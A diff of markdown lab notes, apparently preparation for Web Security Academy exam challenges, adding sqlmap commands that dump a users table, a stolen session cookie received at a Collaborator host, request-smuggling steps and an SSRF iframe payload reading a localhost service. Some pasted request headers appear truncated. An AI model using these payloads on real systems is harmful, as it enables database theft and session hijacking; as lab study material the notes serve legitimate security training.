@@ -27,28 +27,36 @@ location = "https://0a93007e04e29b2ac06b2cf100ad00fe.web-security-academy.net/?t
 >adv search filters - sqlmap  
 
 ```
-sqlmap -u 
-
+sqlmap -v -u 'https://TARGET.net/advance?term=x&sortby=DATE&blogartist=' -p "term" --batch --cookie="_lab=YESYESYES%3d; session=YESYESYES" --random-agent --level=2 --risk=2
 ```  
-  
+
+```
+sqlmap -v -u 'https://TARGET.net/advance?term=x&sortby=DATE&blogartist=' -p "term" --batch --cookie="_lab=YESYESYES%3d; session=YESYESYES" --random-agent --level=2 --risk=2 --dbms=PostgreSQL
+```
+
+```
+sqlmap -v -u 'https://TARGET.net/advance?term=x&sortby=DATE&blogartist=' -p "term" --batch --cookie="_lab=YESYESYES%3d; session=YESYESYES" --random-agent --level=2 --risk=2 --dbms PostgreSQL -D public -T users --dump
+```  
+
 
 >change email + set pass  
 
 ```
 attacker@exploit-1234.exploit-server.net
-
-```
+```  
 
 ## 1 - 3  
 
 >admin file image path + size parameters ????
 
 ```
-
+GET /admin_controls/metrics/adminimage?imagefilename=/blog/posts/49.jpg&size=%22200x133%21%22 HTTP/2
 ```  
 
+>path traversal ? Template injection ? SSRF ? Access control ? LFI ?  
+  
 ## 2 - 1  
-
+  
 >identify `User-Agent` in blog post comment load `/post?postId=10`  
 
 >http smuggle request  
@@ -83,12 +91,12 @@ x=1
 >COLLABORATOR received  
 
 ```
-GET /?APP=session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--blah%blah%2f%blah%2b%blah%blah%3d%3d HTTP/1.1
+GET /?APP=session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--blah%blah%2f% HTTP/1.1
 Host: COLLABORATOR.oastify.com
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+User-Agent: Mozilla/5.0 (Victim) Apple/111.0.5563.64 Safari/537.36
+Accept: text/html,application/.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US
 ```
@@ -146,3 +154,24 @@ Content-Length: 3441
 
 >SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.
 
+```
+POST /adminpanel/save-metrics HTTP/2
+Host: TARGET.net
+Cookie: session=%7b%22username%22%3a%22administrator%22%2c%22isloggedin%22%3atrue%7d--MCwCFBP%3d%3d;
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://target.net/adminpanel
+Content-Type: application/json
+Origin: https://target.net
+Content-Length: 97
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+{"PageHtml":"<h1>XSS</h1>\n<iframe src='http://localhost:6566/secret' height='750' width='750'>"}
+```  
+
+>open pdf with extracted data  
